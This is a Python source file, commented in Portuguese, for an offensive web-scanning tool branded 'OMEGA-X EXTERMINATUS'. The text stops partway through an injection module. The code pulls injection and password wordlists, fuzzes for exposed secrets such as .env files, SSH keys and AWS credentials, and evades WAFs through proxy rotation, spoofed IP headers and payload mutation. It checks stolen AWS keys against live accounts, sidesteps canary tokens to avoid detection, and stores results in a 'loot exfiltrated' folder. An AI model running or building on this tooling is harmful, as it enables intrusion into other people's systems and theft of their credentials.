##########################################################################
# ♦ INSANE OMEGA-X EXTERMINATUS v2.0 - THE ULTIMATE GOD-MODE VALIDATOR ♦
# [STATUS: APT-LEVEL | FULL SPECTRUM | EXPLOIT CHAINING | CLOUD EXFIL]
# [UPDATED: PROXY ROTATION & WAF EVASION POOL]
##########################################################################

import re
import os
import requests
import urllib3
import threading
import time
import json
import datetime
import random
import socket
import base64
import hashlib
import sys
import asyncio
import httpx
import yara
try:
    import boto3
    from botocore.exceptions import ClientError
    from urllib.parse import urlparse
except ImportError:
    pass

from urllib.parse import urljoin, urlparse, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed

# Silenciar avisos SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- [1. DEFINIÇÃO DAS FUNÇÕES DE SUPORTE] ---

# Caminho codificado conforme o seu original
ENCODED_PATH = "L2hvbWUvbmFrcHMvQVBULUlOU0FORS9QQVlMT0FEUw=="

def get_path(encoded_str):
    return base64.b64decode(encoded_str).decode('utf-8')

def sync_wordlists_omega():
    """
    ARSENAL OMEGA-X TOTAL: Sincronização Integral Otimizada.
    FORÇANDO LEITURA INTEGRAL DE 31 FONTES ÚNICAS COM REMOÇÃO DE DUPLICATAS.
    """
    # 1. Garante o caminho correto
    path_raw = base64.b64decode("L2hvbWUvbmFrcHMvQVBULUlOU0FORS9QQVlMT0FEUw==").decode('utf-8')
    
    if not os.path.exists(path_raw):
        os.makedirs(path_raw, exist_ok=True)

    # 2. LISTA DE TUPLAS (Arsenal Completo - 31 FONTES)
    lista_final_fontes = [
        ("assetnote_k8s_automated.txt", "https://wordlists-cdn.assetnote.io/data/automated/httparchive_subdomains_2024_05_28.txt"),
        ("subdomain_haddix_all.txt", "https://gist.githubusercontent.com/jhaddix/86a065aa4f39105090f0/raw/all.txt"),
        ("subdomain_haddix_main.txt", "https://raw.githubusercontent.com/jhaddix/all.txt"),
        ("subdomain_takeover.txt", "https://raw.githubusercontent.com/EdOverflow/can-i-take-over-xyz/master/signatures.json"),
        ("raft_large_files.txt", "https://raw.githubusercontent.com/DanielMiessler/SecLists/master/Discovery/Web-Content/raft-large-files.txt"),
        ("raft_large_directories.txt", "https://raw.githubusercontent.com/DanielMiessler/SecLists/master/Discovery/Web-Content/raft-large-directories.txt"),
        ("raft_large_words.txt", "https://raw.githubusercontent.com/DanielMiessler/SecLists/master/Discovery/Web-Content/raft-large-words.txt"),
        ("fuzzing_common.txt", "https://raw.githubusercontent.com/DanielMiessler/SecLists/master/Discovery/Web-Content/common.txt"),
        ("fuzz_booom_full.txt", "https://raw.githubusercontent.com/BoOoM/fuzz.txt/master/fuzz.txt"),
        ("wfuzz_common.txt", "https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/general/common.txt"),
        ("mutations_common.txt", "https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/general/mutations_common.txt"),
        ("extensions_common.txt", "https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/general/extensions_common.txt"),
        ("api_endpoints.txt", "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-endpoints-reslist.txt"),
        ("api_kiterunner_all.txt", "https://raw.githubusercontent.com/assetnote/kiterunner/master/wordlists/data/kiterunner-all.txt"),
        ("param_arjun.txt", "https://raw.githubusercontent.com/s0md3v/Arjun/master/arjun/db/params.txt"),
        ("sqli_massive.txt", "https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/detect/Generic_SQLI.txt"),
        ("lfi_advanced.txt", "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruder/LFI-probing-Windows-Unix.txt"),
        ("rce_inside_html.txt", "https://raw.githubusercontent.com/payloadbox/command-injection-payload-list/master/Inside-HTML.txt"),
        ("ssti.txt", "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Intruder/ssti.txt"),
        ("ssrf.txt", "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/SSRF%20Payloads.txt"),
        ("xss.txt", "https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-without-parentheses.txt"),
        ("open_redirect.txt", "https://raw.githubusercontent.com/payloadbox/open-redirect-payload-list/master/open-redirect-payload-list.txt"),
        ("403_bypass_elite.txt", "https://raw.githubusercontent.com/lobuhi/bypassing-403-checks/master/paths.txt"),
        ("auth_bypass_logic.txt", "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-better-default-passwords.txt"),
        ("cloud_enum_combined.txt", "https://raw.githubusercontent.com/initstring/cloud_enum/master/enum_dictionaries/combined_cloud_names.txt"),
        ("rockyou.txt", "https://github.com/brannondorsey/naive-hash-cat/releases/download/data/rockyou.txt"),
        ("xato_10m.txt", "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/xato-net-10-million-passwords.txt"),
        ("xato_1m.txt", "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt"),
        ("xato_100k.txt", "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/xato-net-10-million-passwords-100000.txt"),
        ("sensitive_files.txt", "https://raw.githubusercontent.com/DanielMiessler/SecLists/master/Discovery/Web-Content/Interesting-Files.txt"),
        ("env_files.txt", "https://raw.githubusercontent.com/DanielMiessler/SecLists/master/Discovery/Web-Content/Common-PHP-Filenames.txt")
    ]

    print(f"\n\033[1;34m[~] MEGA-SYNC OMEGA: Iniciando {len(lista_final_fontes)} fontes...\033[0m")

    # User-Agents para evitar bloqueios
    U_AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (X11; Linux x86_64)", "Mozilla/5.0 (iPhone; CPU OS 17_2_1)"]

    for filename, url in lista_final_fontes:
        dest_path = os.path.join(path_raw, filename)
        try:
            # Download Otimizado
            response = requests.get(url, headers={"User-Agent": random.choice(U_AGENTS)}, stream=True, timeout=15, verify=False)
            
            if response.status_code == 200:
                # Processamento inteligente para TXT ou JSON
                new_payloads = []
                if url.endswith('.json'):
                    try:
                        raw_data = response.json()
                        new_payloads = [str(x) for x in raw_data.keys()] if isinstance(raw_data, dict) else [str(x) for x in raw_data]
                    except:
                        new_payloads = response.text.splitlines()
                else:
                    new_payloads = response.text.splitlines()

                # Mesclagem com arquivo local (se existir) para evitar duplicatas
                existing = []
                if os.path.exists(dest_path):
                    with open(dest_path, 'r', encoding='utf-8', errors='ignore') as f:
                        existing = f.read().splitlines()
                
                # Unifica e remove duplicatas usando set()
                combined = list(set(filter(None, existing + new_payloads)))

                with open(dest_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(combined))
                
                print(f"\033[1;32m(v) {filename.ljust(35)} | Sincronizado | Total: {len(combined)}\033[0m")
            else:
                if os.path.exists(dest_path):
                    print(f"\033[1;33m[!] {filename.ljust(35)} | Local (Offline)\033[0m")
                else:
                    print(f"\033[1;31m[X] {filename.ljust(35)} | Status {response.status_code}\033[0m")
        except Exception:
            if os.path.exists(dest_path):
                print(f"\033[1;33m[!] {filename.ljust(35)} | Local (Offline)\033[0m")
            else:
                print(f"\033[1;31m[X] {filename.ljust(35)} | Erro Conexão\033[0m")

    print(f"\033[1;90m{'-' * 85}\033[0m")

# --- [2. DEFINIÇÃO DE DIRETÓRIOS E VARIÁVEIS GLOBAIS] ---

base_path = os.path.join(os.getcwd(), "PAYLOADS")
OUTPUT_DIR = os.path.join(os.getcwd(), "OMEGA-RESULTS")

LOOT_DIR = os.path.join(OUTPUT_DIR, "LOOT_EXFILTRATED")
REPORTS_DIR = os.path.join(OUTPUT_DIR, "REPORTS_JSON")
FINAL_JSON = os.path.join(OUTPUT_DIR, "INSANE_FINAL_REPORT.json")
DASHBOARD_HTML = os.path.join(OUTPUT_DIR, "DASHBOARD.html")
PAYLOADS_DIR = base_path

# --- [3. CRIAÇÃO DE AMBIENTE] ---

for d in [base_path, OUTPUT_DIR, LOOT_DIR, REPORTS_DIR]:
    os.makedirs(d, exist_ok=True)

MAX_THREADS = 25
DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK")

# [MELHORIA 1] - Pool de Proxies
PROXIES = [
    "http://185.199.229.156:7492",
    "http://198.199.86.11:8080",
    "http://159.203.61.169:3128",
    "http://64.227.14.141:8080"
]

# [MELHORIA 2] - Pool de User-Agents para Evasão (AMPLIFICAÇÃO ELITE)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.164 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.164 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "Mozilla/5.0 (PlayStation 5 7.40) AppleWebKit/605.1.15 (KHTML, like Gecko) Java/1.8.0_202",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18"
]

CALLBACK_HOST = ""
OOB_API_CHECK = "http://api.seu-servidor.com/check?id="

def get_random_header():
    """Gera cabeçalhos aleatórios para cada requisição para evitar bloqueio."""
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0"
    }

def extract_targets_with_metadata(file_path):
    """
    Filtra o relatório mantendo a relação entre ID e URL e valida chaves AWS em tempo real.
    """
    refined_targets = []
    current_id = None
    current_detection = None
    
    # Dicionário para tentar parear Access Key ID com Secret Key se estiverem no mesmo bloco
    aws_buffer = {"id": None, "secret": None}

    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                # 1. Captura o ID do achado
                if '[FIND ID]' in line:
                    current_id = line.split(']')[1].strip()
                    aws_buffer = {"id": None, "secret": None} # Reseta para novo bloco
                
                # 2. Identifica o tipo de detecção
                elif '[DETECTION]' in line:
                    current_detection = line.split(']')[1].strip()

                # 3. Se for AWS, tenta capturar o segredo e validar
                elif '[SECRET RAW]' in line and current_detection == "AWS_SECRET_KEY":
                    secret_raw = line.split(']')[1].strip()
                    print(f"\033[1;33m[*] Analisando potencial chave AWS no FIND ID: {current_id}...\033[0m")
                    
                    # Tenta validar (Aqui assume-se que o secret_raw é a Secret Key)
                    # Nota: Idealmente você precisa do Access Key ID. 
                    # Se o relatório tiver o par, a função validate_aws_keys deve ser chamada aqui.
                    validate_aws_keys("AKIA_EXAMPLE_ID", secret_raw) 

                # 4. Captura a URL para o ataque principal do APT-Insane
                elif '[URL]' in line or '[ENDPOINT]' in line:
                    potential_url = line.split(']')[1].strip()
                    if potential_url.startswith('http'):
                        refined_targets.append({'id': current_id, 'url': potential_url})
        
        # Gera o dicionário de URLs únicas para o AuditorCore
        unique_urls = {t['url']: t['id'] for t in refined_targets}
        print(f"\033[1;32m[+] Parser OMEGA: {len(unique_urls)} alvos e validações concluídas.\033[0m")
        return unique_urls

    except Exception as e:
        print(f"\033[1;31m[!] Erro no processamento: {e}\033[0m")
        return {}

def validate_aws_keys(key_id, secret_key):
    """
    Tenta validar chaves AWS encontradas em arquivos JS ou relatórios.
    """
    try:
        session = boto3.Session(
            aws_access_key_id=key_id,
            aws_secret_access_key=secret_key
        )
        sts = session.client('sts')
        identity = sts.get_caller_identity()
        print(f"\033[1;31m[!!!] VULNERABILIDADE CRÍTICA: Chave AWS Válida!\033[0m")
        print(f"      Account: {identity['Account']} | ARN: {identity['Arn']}")
        return True
    except Exception:
        return False

# --- [VIGILÂNCIA DE CALLBACK] ---

def monitor_callback_hits(log_file="callback_hits.log"):
    global CALLBACK_HOST
    if not os.path.exists(log_file):
        open(log_file, 'a').close()
    last_size = os.path.getsize(log_file)
    while True:
        try:
            curr_size = os.path.getsize(log_file)
            if curr_size > last_size:
                with open(log_file, "r") as f:
                    f.seek(last_size)
                    content = f.read()
                    if CALLBACK_HOST and CALLBACK_HOST in content:
                        sys.stdout.write("\r\033[K")
                        print(f"\n\033[1;91m[☢️ OOB HIT!] INTERAÇÃO DETECTADA: {CALLBACK_HOST}\033[0m")
                last_size = curr_size
            time.sleep(2)
        except: 
            pass

class SecurityPolicy:
    ALLOWED_DOMAINS = set()
    last_request_time = {}

    @staticmethod
    def load_scope(file_path):
        try:
            with open(file_path, "r") as f:
                content = f.read()
                SecurityPolicy.ALLOWED_DOMAINS = set(re.findall(r'URL\] https?://([^/\s?#]+)', content))
            print(f"[*] Escopo carregado: {len(SecurityPolicy.ALLOWED_DOMAINS)} domínios autorizados.")
        except Exception as e:
            print(f"❌ Erro ao carregar escopo: {e}")

    @classmethod
    def is_in_scope(cls, url):
        if not cls.ALLOWED_DOMAINS: return True
        hostname = urlparse(url).netloc.lower()
        for domain in cls.ALLOWED_DOMAINS:
            if hostname == domain or hostname.endswith(f".{domain}"):
                return True
        return False

    @staticmethod
    def apply_delay(url, seconds=1.5):
        domain = urlparse(url).netloc
        now = time.time()
        if domain in SecurityPolicy.last_request_time:
            elapsed = now - SecurityPolicy.last_request_time[domain]
            if elapsed < seconds: time.sleep(seconds - elapsed)
        SecurityPolicy.last_request_time[domain] = time.time()

class WAFDetector:
    @staticmethod
    def detect(headers, body, status_code):
        sigs = {
            "Cloudflare": ["cf-ray", "__cfduid", "cloudflare-nginx", "cloudflare"],
            "Akamai": ["akamai", "ak_bmsc", "akamai-grn"],
            "Imperva/Incapsula": ["incap_ses", "visid_incap", "incapsula", "x-iinfo"],
            "F5 BIG-IP": ["bigip", "f5_cspm", "x-wa-info"],
            "AWS WAF": ["x-amz-waf", "awswaf"],
            "ModSecurity": ["mod_security", "no-cache=\"set-cookie\"", "modsecurity"],
            "Sucuri": ["x-sucuri-id", "x-sucuri-cache", "sucuri cloudproxy"],
            "Barracuda": ["barra_counter_session", "x-asw-"],
            "FortiWeb": ["fortiwafsid"]
        }

        h_str = str(headers).lower()
        b_str = str(body).lower()

        for name, markers in sigs.items():
            for marker in markers:
                if marker in h_str:
                    return name

        if "cloudflare" in b_str and "ray id" in b_str:
            return "Cloudflare (Blocking Page)"
        if "distilnetworks" in b_str:
            return "Distil Networks"
        if "protected by sucuri" in b_str:
            return "Sucuri"

        if status_code == 403:
            return "Unknown WAF/IPS (Potential)"

        return "None"

class EliteWordlist:
    CRITICAL_PATHS = [
        "/.env", "/.env.local", "/.env.production", "/.env.old", "/.env.bak",
        "/.git/config", "/.git/index",
        "/.vscode/settings.json",
        "/.ssh/id_rsa", "/.ssh/authorized_keys",
        "/config/database.yml", "/config/settings.py",
        "/phpinfo.php", "/info.php",
        "/actuator/env", "/actuator/heapdump",
        "/core/config/databases.yml",
        "/.aws/credentials",
        "/.npmrc", "/.docker/config.json",
        "/.git/HEAD", "/.git/logs/HEAD", "/.gitignore",
        "/backup.zip", "/www.zip", "/config.php.bak",
        "/config.php.old", "/config.php.save", "/.bash_history",
        "/.db_backup", "/db.sql", "/dump.sql", "/backup.sql",
        "/storage/logs/laravel.log", "/composer.json", "/package-lock.json",
        "/app/config/parameters.yml", "/config/settings.json",
        "/WEB-INF/web.xml", "/WEB-INF/config.xml",
        "/appsettings.json", "/appsettings.Development.json",
        "/actuator/health", "/actuator/mappings", "/actuator/beans",
        "/druid/index.html", "/swagger-ui.html", "/v2/api-docs",
        "/v3/api-docs", "/django_admin/", "/admin/login",
        "/.kube/config", "/.docker/config.json",
        "/.firebase/config.json", "/.azure/credentials",
        "/terraform.tfstate", "/terraform.tfstate.backup",
        "/web-console/", "/console/",
        "/.DS_Store",
        "/server-status",
        "/robots.txt",
        "/.history", "/.sh_history"
    ]

    @staticmethod
    def get_fuzz_targets(base_url):
        base_url = base_url.rstrip('/')
        targets = []
        sub_dirs = ["", "/api", "/v1", "/v2", "/admin", "/dev", "/test", "/backup", "/conf"]
        bypass_prefixes = ["", "/%2e", "/.", "/..;/"]

        for path in EliteWordlist.CRITICAL_PATHS:
            clean_path = path if path.startswith('/') else f"/{path}"
            for sd in sub_dirs:
                for bp in bypass_prefixes:
                    full_path = f"{sd}{bp}{clean_path}".replace("//", "/")
                    targets.append(f"{base_url}{full_path}")

            if "." in clean_path:
                for ext in [".bak", ".old", "~", ".save", ".tmp"]:
                    targets.append(f"{base_url}{clean_path}{ext}")

        return list(dict.fromkeys(targets))

class OmniValidator:
    @staticmethod
    def show_payload(p):
        clean_p = str(p).replace('\n', ' ').strip()
        display = (clean_p[:45] + '..') if len(clean_p) > 45 else clean_p
        sys.stdout.write(f"\r\033[K\033[90m[PAYLOAD] {display}\033[0m")
        sys.stdout.flush()

    @staticmethod
    def mutate_payload(payload):
        if not isinstance(payload, str) or len(payload) < 2: return payload

        def junk_padding(p):
            junk = ["/**/", "/*!50000*/", "/*%00*/", "//--", "/./"]
            return p.replace(" ", random.choice(junk))

        def hex_encode(p):
            return "0x" + "".join(f"{ord(c):02x}" for c in p)

        def path_confusion(p):
            if "/" in p:
                return p.replace("/", "/././")
            return p

        mutacoes = [
            lambda p: quote(quote(p)),
            lambda p: f"%0a%0d{p}",
            lambda p: f"{p}%00",
            lambda p: "".join(f"\\u{ord(c):04x}" for c in p) if "http" not in p else p,
            hex_encode,
            lambda p: "".join(c.upper() if random.random() > 0.5 else c.lower() for c in p),
            junk_padding,
            lambda p: "".join(f"&#{ord(c)};" for c in p),
            path_confusion
        ]

        m = random.choice(mutacoes)(payload)
        if random.random() > 0.7:
            m = random.choice(mutacoes)(m)
        return m

    @staticmethod
    def get_random_ua():
        return random.choice(USER_AGENTS)

    @staticmethod
    def get_headers():
        fake_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
        return {
            "User-Agent": OmniValidator.get_random_ua(),
            "X-Forwarded-For": fake_ip,
            "X-Real-IP": fake_ip,
            "X-Originating-IP": "127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "Metadata-Flavor": "Google",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1"
        }

    @staticmethod
    def request_with_retry(url, method="GET", params=None, headers=None, json_data=None, timeout=5, auto_mutate=True):
        """
        MOTOR DE REQUISIÇÃO OMEGA-X EXTERMINATUS:
        - Evasão de WAF via Smuggling de Cabeçalhos (L7)
        - Spoofing de IP e Protocolo Dinâmico
        - Resiliência a URLs Malformadas (Safe Path)
        - Backoff Adaptativo para Rate Limiting (429)
        """
        for attempt in range(1, 4):
            proxy_cfg = None
            if PROXIES:
                p = random.choice(PROXIES)
                proxy_cfg = {"http": p, "https": p}

            # 1. Recupera headers base e rotaciona Identidade
            current_headers = OmniValidator.get_headers()
            if headers:
                current_headers.update(headers)

            # 2. Lógica de Bypass de Protocolo e Path (Seguro contra Crashes)
            proto_bypass = random.choice(["http", "https"])
            port_bypass = "443" if proto_bypass == "https" else "80"
            
            try:
                # Extração segura do path para evitar erro em URLs truncadas
                safe_path = urlparse(url).path
                if not safe_path: safe_path = "/"
            except Exception:
                safe_path = "/"

            # 3. Pool de IPs de Bypass (Simulação de Redes Internas)
            bypass_ips = [
                "127.0.0.1", "localhost", "0.0.0.0", "::1", "192.168.0.1",
                "10.0.0.1", "172.16.0.1", f"127.0.0.{random.randint(2, 254)}"
            ]
            target_ip = random.choice(bypass_ips)

            # 4. Injeção Massiva de Cabeçalhos de Evasão
            current_headers.update({
                "X-Forwarded-For": target_ip,
                "X-Originating-IP": target_ip,
                "X-Remote-IP": target_ip,
                "X-Remote-Addr": target_ip,
                "X-Client-IP": target_ip,
                "X-Real-IP": target_ip,
                "X-ProxyUser-Ip": target_ip,
                "True-Client-IP": target_ip,
                "CF-Connecting-IP": f"1.1.1.{random.randint(1, 254)}",
                "X-Forwarded-Proto": proto_bypass,
                "X-Forwarded-Port": port_bypass,
                "X-Forwarded-Host": "localhost",
                "X-Custom-IP-Authorization": target_ip,
                "X-Rewrite-URL": safe_path,
                "X-Original-URL": safe_path,
                "Max-Forwards": "10",
                "Contact": "root@localhost",
                "Cache-Control": "no-cache, no-store, must-revalidate, max-age=0",
                "Pragma": "no-cache",
                "Expires": "0",
                "X-Appengine-Remote-Addr": target_ip,
                "X-Cloud-Trace-Context": f"{random.getrandbits(128):032x}",
                "User-Agent": AuditorCore.get_random_ua()  # Sincronizado com seu pool de elite
            })

            try:
                # 5. Execução da Requisição com Isolamento de Sessão
                with requests.Session() as session:
                    session.proxies = proxy_cfg
                    session.verify = False  # Ignora erros de SSL comuns em bypass
                    
                    res = session.request(
                        method=method,
                        url=url,
                        params=params,
                        headers=current_headers,
                        json=json_data,
                        timeout=timeout,
                        allow_redirects=True
                    )

                # --- [TRATAMENTO DE RESPOSTA INTELIGENTE] ---

                # Caso 429: Respeita o servidor para evitar ban de IP
                if res.status_code == 429:
                    wait = int(res.headers.get("Retry-After", 2 ** attempt + random.random()))
                    sys.stdout.write(f"\r\033[93m[!] Rate Limit (429) em {urlparse(url).netloc}. Aguardando {wait}s...\033[0m")
                    time.sleep(wait)
                    continue

                # Caso 403: Detecção de WAF e Tentativa de Mutação Polimórfica
                if res.status_code == 403 and auto_mutate:
                    waf_name = WAFDetector.detect(res.headers, res.text, res.status_code)
                    if params:
                        sys.stdout.write(f"\n\033[95m[!] WAF {waf_name} Detectado. Aplicando Mutação Polimórfica...\033[0m\n")
                        mutated_params = {k: OmniValidator.mutate_payload(v) for k, v in params.items()}
                        # Recursão única com mutação ativa
                        return OmniValidator.request_with_retry(
                            url, method, params=mutated_params, headers=current_headers,
                            json_data=json_data, auto_mutate=False
                        )
                    time.sleep(attempt * 1.5)
                    continue

                # Detecção de Bloqueio Silencioso (CAPTCHA / Access Denied no Body)
                if any(x in res.text.lower() for x in ["blocked by", "security challenge", "captcha", "access denied"]):
                    sys.stdout.write(f"\r\033[91m[!] Bloqueio Silencioso em {urlparse(url).netloc}. Rotacionando...\033[0m")
                    time.sleep(attempt + 2)
                    continue

                return res

            except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout) as e:
                # Erros de rede: Tenta novamente até o limite de 3 tentativas
                continue
            except Exception as e:
                # Erros inesperados: Loga e aguarda curto período
                time.sleep(0.5)
                continue
                
        # --- [LOGICA DEAD LETTER QUEUE (DLQ)] ---
        # Se chegou aqui, é porque falhou em TODAS as 3 tentativas.
        try:
            with open(FAILED_LOG, "a", encoding="utf-8") as f:
                f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | FAIL | {url}\n")
            sys.stdout.write(f"\r\033[91m[DLQ] Alvo descartado após 3 falhas: {urlparse(url).netloc}\033[0m\n")
        except:
            pass

        return None

    @staticmethod
    def yara_scan(text):
        if not hasattr(OmniValidator, "_yara_rules"):
            rule_source = r"""
            rule Elite_Secrets_Hunter {
                meta:
                    author = "Omega-X"
                    severity = "CRITICAL"
                strings:
                    $aws_key = /AKIA[0-9A-Z]{16}/
                    $aws_secret = /AWS_SECRET_ACCESS_KEY/
                    $gcp_key = /"private_key": "---BEGIN PRIVATE KEY---/
                    $azure_secret = /client_secret":"[a-zA-Z0-9.~_-]{34}"/
                    $github = /gh[p|o|u|s|r]_[A-Za-z0-9_]{36,255}/
                    $php_eval = /eval\(base64_decode\(/
                    $php_shell = /system\(\$_GET\[/
                    $jsp_exec = /Runtime\.getRuntime\(\)\.exec\(/
                    $ssh_key = /-----BEGIN (RSA|OPENSSH|DSA|EC) PRIVATE KEY-----/
                    $db_pass = /DB_PASSWORD|MYSQL_ROOT_PASSWORD|POSTGRES_PASSWORD/
                condition:
                    any of them
            }
            """
            try:
                OmniValidator._yara_rules = yara.compile(source=rule_source)
            except Exception:
                return []

        findings = []
        try:
            matches = OmniValidator._yara_rules.match(data=text)
            for m in matches:
                hit_tags = [s[1] for s in m.strings]
                findings.append({
                    "msg": f"🎯 YARA ELITE HIT: {m.rule} (Types: {', '.join(set(hit_tags[:3]))})",
                    "severity": "CRITICAL",
                    "cvss": 9.8
                })
        except Exception:
            pass
        return findings

    @staticmethod
    def regex_advanced_scan(text):
        findings = []
        patterns = {
            "JWT Token": (r"eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*", "HIGH", 7.5),
            "Slack Webhook": (r"https://hooks\.slack\.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+/[a-zA-Z0-9_]+", "CRITICAL", 8.5),
            "Firebase URL": (r"https://[a-z0-9.-]+\.firebaseio\.com", "MEDIUM", 5.0),
            "Google API Key": (r"AIza[0-9A-Za-z-_]{35}", "HIGH", 8.0),
            "Heroku API Key": (r"(?i)heroku.*[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}", "CRITICAL", 9.0),
            "Mailgun API Key": (r"key-[0-9a-zA-Z]{32}", "HIGH", 7.5),
            "Generic High-Entropy Secret": (r"(?i)(?<=[='\" \t])([a-z0-9\/+]{40,})(?=[='\" \t\n])", "HIGH", 7.0),
            "Private Key Block": (r"-----BEGIN [A-Z ]+ PRIVATE KEY-----", "CRITICAL", 9.5),
            "Database Connection (Generic)": (r"(?i)(?:postgres|mysql|mongodb|sftp|redis):\/\/[^:/\s]+:[^@/\s]+@[^/\s]+", "CRITICAL", 9.0),
            "AWS Client ID": (r"(?i)(access_key|aws_id|access_id)[:=]\s*['\"]?(A3T[A-Z0-9]{16})['\"]?", "HIGH", 8.5)
        }

        context_patterns = [
            (r"(?i)(?:password|passwd|secret|key|token|auth|credential)[:=]\s*['\"]([^'\"\s]{6,})['\"]", "Credencial em Atribuição"),
            (r"(?i)(?:db_url|database_url|conn_str)[:=]\s*['\"]([^'\"\s]{10,})['\"]", "String de Conexão em Variável")
        ]

        for name, (pat, sev, cvss) in patterns.items():
            matches = re.finditer(pat, text)
            for match in matches:
                snippet = match.group(0)[:50]
                findings.append({
                    "msg": f"🔍 {name} Detectado: {snippet}...",
                    "severity": sev,
                    "cvss": cvss
                })

        for pat, msg in context_patterns:
            matches = re.finditer(pat, text)
            for match in matches:
                secret_value = match.group(1)
                if secret_value.lower() in ['true', 'false', 'null', 'none', 'undefined', 'password', 'root']:
                    continue
                findings.append({
                    "msg": f"🔑 {msg} Encontrada",
                    "severity": "HIGH",
                    "cvss": 8.2
                })

        unique_findings = {f['msg']: f for f in findings}.values()
        return list(unique_findings)

    @staticmethod
    def aws_validator(text, domain):
        findings = []
        traps = ["canary", "honeypot", "thinkst", "fake", "audit", "test"]
        try:
            ak_keys = re.findall(r"(?:AKIA|ASIA)[0-9A-Z]{16}", text)
            sk_keys = re.findall(r"(?<=['\"])[a-zA-Z0-9/+=]{40}(?=['\"])", text)

            if not ak_keys or not sk_keys: return []

            ak, sk = ak_keys[0], sk_keys[0]
            if any(t in text.lower() for t in traps) or any(t in domain.lower() for t in traps):
                return [{"msg": "🛑 CANARY TOKEN DETECTADO: Validação abortada para proteção do IP.", "severity": "CRITICAL"}]
        except Exception:
            pass 
        
        return findings 

# --- [1] MÓDULO: RCE, SQLi & SSTI ---
    @staticmethod
    def validate_injection_pro(url, param):
        """
        FUSÃO EXTERMINATUS: RCE, SQLi, SSTI & LFI
        - Baseline Estatístico de Latência (Anti-Lag)
